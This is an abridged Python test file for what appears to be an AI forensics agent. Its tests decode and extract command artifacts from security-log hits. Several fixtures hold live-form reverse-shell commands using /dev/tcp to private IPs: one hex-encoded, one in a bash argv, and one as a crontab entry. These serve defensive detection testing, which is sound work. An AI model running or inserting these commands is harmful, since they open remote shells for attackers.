...
from agent.runtime.graph.nodes_flow import (
    ...
    _synthesize_investigation_report,
)
...
class TestFindingsBoard(unittest.TestCase):
    ...
    def test_preserved_findings_replace_none_section(self):
        ...
        merged = _merge_preserved_findings(
            report,
            [
                {
    ...
    def test_report_synthesis_feeds_model_its_confirmed_findings(self):
        ...
        state = {
            ...
            "messages": [
                ...
                ToolMessage(name="search", tool_call_id="t", content="{}"),
            ],
            "ctx_tokens": 0,
            ...
            "task_ledger": {
                "confirmed_findings": [
                    {
                        "summary": "reverse shell to 10.0.2.5 confirmed",
                        "event_ids": ["e9"],
                    },
                ],
            },
    ...
    def test_hex_encoded_reverse_shell_is_decoded_as_command_artifact(self):
        ...
        hex_payload = (
            "7368202d69203e26202f6465762f7463702f31302e302e322e352f3535353520303e2631"
        )
        raw = json.dumps(
            {
                "hits": {
        ...
        self.assertTrue(
            any("[hex-decoded]" in c and "/dev/tcp/" in c for c in commands),
    ...
    def test_base64_webshell_reverse_shell_in_url_param_is_decoded(self):
        ...
        argv = [
            "bash",
            "-c",
            " '0<&196;exec 196<>/dev/tcp/192.168.130.77/51898; sh <&196 >&196 2>&196'",
            "&",
        ]
        ...
        ips = [a.value for a in artifacts if a.kind == "ip"]
        self.assertTrue(
            any("/dev/tcp/" in c and "decoded" in c.lower() for c in commands),
    ...
    def test_base64_webshell_argv_without_shell_keyword_is_decoded(self):
        ...
        self.assertTrue(
            any("mysql" in c and "wp_users" in c for c in commands),
    ...
    def test_random_base64_noise_is_not_recorded_as_command(self):
        ...
        noise = base64.b64encode(
            b"this is just some opaque session identifier value 12345"
        ).decode()
        raw = json.dumps(
            {
                "hits": {
    ...
    def test_fim_diff_reverse_shell_is_cleaned_of_diff_markers(self):
        ...
        self.assertTrue(
            any(
                c == "* * * * * sh -i >& /dev/tcp/10.0.2.5/5555 0>&1" for c in commands
            ),
        ...
        self.assertFalse(
            any(
                c.strip() in {"0a1", ">", "<"} or c.startswith(("> ", "< ", "0a1"))
                for c in commands
            ),
        ...
        state = {
            ...
            "messages": [
                AIMessage(
                    content="",
                    tool_calls=[
                        {"id": "call-1", "name": "search", "args": {"query": "*"}}
                    ],
                )
            ],
            "tool_calls_made": 0,
    ...
    def test_section_parser_stops_at_h3_and_hypotheses_headers(self):
        ...
        hypotheses = [
            entry["content"] for entry in entries if entry["kind"] == "hypothesis"
        ]
        self.assertEqual(
            facts, ["Event evt-1 at 2025-04-20T03:54:00Z modified crontab."]
        )
